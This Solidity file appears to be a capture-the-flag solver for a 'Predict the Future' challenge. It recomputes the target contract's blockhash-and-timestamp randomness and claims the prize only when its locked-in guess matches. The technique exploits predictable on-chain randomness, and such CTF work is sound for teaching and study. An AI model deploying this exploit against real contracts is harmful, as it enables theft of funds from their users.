// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {console} from "@forge-std/console.sol";

interface IChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheFutureSolver {

    address owner;
    IChallenge challenge;
    uint8 guess;

    constructor(address _challenge,uint8 _guess) payable {
        require(msg.value == 1 ether);
        challenge = IChallenge(_challenge);
        owner = msg.sender;
        guess = _guess;
        challenge.lockInGuess{value: 1 ether}(guess);
    }

    function settleChallenge() external {
        uint8 answer = uint8(
            uint256(  
                keccak256( abi.encodePacked(
                    blockhash(block.number - 1), block.timestamp)
                )
            )
        )% 10;

        console.log('answer', answer);
        console.log('guess', guess);
        console.log('block.number', block.number);

         if(answer == guess) {
            challenge.settle();
            console.log('balance before', address(this).balance);
            payable(owner).transfer(2 ether);
            console.log('balance after', address(this).balance);
         }
    }

    receive() external payable {
    }
    
}